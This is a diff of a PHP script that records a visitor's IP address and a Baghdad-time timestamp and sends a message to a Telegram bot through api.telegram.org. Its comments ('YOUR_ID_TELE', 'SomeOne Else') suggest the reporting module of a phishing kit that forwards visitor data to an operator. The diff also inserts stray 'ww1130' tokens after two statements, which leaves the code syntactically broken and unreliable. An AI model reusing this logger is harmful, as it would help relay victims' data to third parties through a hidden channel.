@@ -1,11 +1,11 @@
 <?php
 
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
+    $ip_address = $_SERVER['HTTP_CLIENT_IP']; ww1130
 } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
     $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
 } else {
-    $ip_address = $_SERVER['REMOTE_ADDR'];
+    $ip_address = $_SERVER['REMOTE_ADDR'];ww1130
 }
 
 $d = new DateTime("now", new DateTimeZone("Asia/Baghdad")); // Set Your country DF Time 
@@ -25,3 +25,4 @@ $YOUR_ID_TELE = "";
 $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
 // SomeOne Else : 
 // $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
+
